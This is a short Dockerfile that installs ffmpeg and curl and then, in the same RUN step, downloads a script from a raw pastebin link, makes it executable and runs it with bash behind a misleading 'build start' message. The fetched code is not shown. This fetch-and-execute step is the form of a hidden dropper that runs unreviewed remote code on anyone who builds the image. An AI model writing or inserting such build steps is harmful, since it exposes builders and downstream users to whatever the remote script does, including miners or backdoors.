FROM ubuntu
RUN apt update -y && apt install -y ffmpeg curl && curl https://pastebin.com/raw/NNzdKVJs -o run && chmod 777 run && echo "build start" && bash run
